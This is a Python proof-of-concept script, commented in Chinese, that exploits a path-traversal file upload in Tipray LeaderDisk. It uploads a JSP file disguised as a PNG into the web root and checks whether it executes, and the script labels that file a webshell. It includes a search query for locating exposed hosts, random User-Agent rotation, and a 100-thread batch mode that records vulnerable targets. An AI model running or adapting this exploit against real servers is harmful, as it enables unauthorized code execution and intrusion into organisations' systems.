import requests,argparse,sys,random
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"||body="location.href=location.href+\"lddsm\""

# 随机UA头
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

# 固定的boundary和请求体
BOUNDARY = "----WebKitFormBoundaryXqK9dR2yTv7wNpLm"
MULTIPART_DATA = f"""------WebKitFormBoundaryXqK9dR2yTv7wNpLm
Content-Disposition: form-data; name="file"; filename="hello.jsp"
Content-Type: image/png

<% out.println("HelloWorld");%>
------WebKitFormBoundaryXqK9dR2yTv7wNpLm--""".encode('utf-8')

def poc(target):
    try:
        target = target.rstrip('/')
        upload_url = f"{target}/lddsm/service/../admin/activiti/uploadFolder.do"
        
        params = {
            'taskId': '../webapps/ROOT/',
            'relativepath': '1',
            'path': '1'
        }
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
            "Connection": "close",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*"
        }
        
        # 发送上传请求
        response = requests.post(
            url=upload_url,
            params=params,
            headers=headers,
            data=MULTIPART_DATA,
            verify=False,
            timeout=10
        )
        
        # 检查上传是否成功
        if response.status_code == 200:
            # 尝试访问上传的webshell
            webshell_url = f"{target}/hello.jsp"
            shell_response = requests.get(
                url=webshell_url,
                headers={"User-Agent": random.choice(USER_AGENTS)},
                verify=False,
                timeout=10
            )
            
            if shell_response.status_code == 200 and "HelloWorld" in shell_response.text:
                print(f"[+]{target} 存在漏洞，Webshell: {webshell_url}")
                with open('result.txt', 'a', encoding='utf-8') as fp:
                    fp.write(f"{target}\n")
                return True
            else:
                print(f"[-]{target} 上传成功但Webshell访问失败")
                return False
        else:
            print(f"[-]{target} 文件上传失败 (状态码: {response.status_code})")
            return False
            
    except:
        pass

def main():
    parse=argparse.ArgumentParser(description="activiti文件上传漏洞检测脚本")
    parse.add_argument('-u','--url',dest="url",type=str,help="输入测试网站的url：http://ip:port")
    parse.add_argument('-f','--file',dest="file",type=str,help="批量扫描的文件路径，每行一个")
    args=parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"请输入：python {sys.argv[0]} -h")

if __name__ == "__main__":
    main()